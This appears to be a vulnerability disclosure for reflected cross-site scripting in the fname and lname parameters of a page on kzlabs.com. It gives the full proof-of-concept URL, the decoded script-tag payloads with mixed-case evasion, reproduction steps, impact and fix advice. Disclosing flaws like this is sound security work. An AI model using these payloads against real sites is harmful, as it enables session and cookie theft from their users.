# Reflected Cross-Site Scripting (XSS) via `fname` and `lname` Parameters

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `fname` and `lname` parameters of the application. User-controlled input is reflected into the response without proper sanitization, allowing arbitrary JavaScript execution in the victim’s browser.

---

## Vulnerable Endpoint

```text
http://kzlabs.com/1.php?fname=%22xicorr%3E%3CsCript%3Ealert%28%22xicorXSS1%22%29%3C%2FsCript%3E&lname=%22xicorr%3E%3CsCript%3Ealert%28%22xicorXSS2%22%29%3C%2FsCript%3E
```

---

## Vulnerable Parameters

```text
fname
lname
```

---

## Payloads Used

```html
"xicorr><sCript>alert("xicorXSS1")</sCript>
```

```html
"xicorr><sCript>alert("xicorXSS2")</sCript>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/1.php?fname=%22xicorr%3E%3CsCript%3Ealert%28%22xicorXSS1%22%29%3C%2FsCript%3E&lname=%22xicorr%3E%3CsCript%3Ealert%28%22xicorXSS2%22%29%3C%2FsCript%3E
   ```

2. Observe that both payloads are reflected into the response.

3. JavaScript executes automatically and triggers popup dialogs.

---

## Proof of Concept

```text
http://kzlabs.com/1.php?fname=%22xicorr%3E%3CsCript%3Ealert%28%22xicorXSS1%22%29%3C%2FsCript%3E&lname=%22xicorr%3E%3CsCript%3Ealert%28%22xicorXSS2%22%29%3C%2FsCript%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/f34ac92c-863e-4c02-b2b8-d446058854a2" />


<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/784c6fd0-f36b-4330-bd67-fae2f7e8334b" />


---

## Impact

* Arbitrary JavaScript execution
* Session hijacking
* Cookie theft

---

## Recommendations for Fix

* Encode output before rendering
* Validate and sanitize user input
* Use secure context-aware escaping
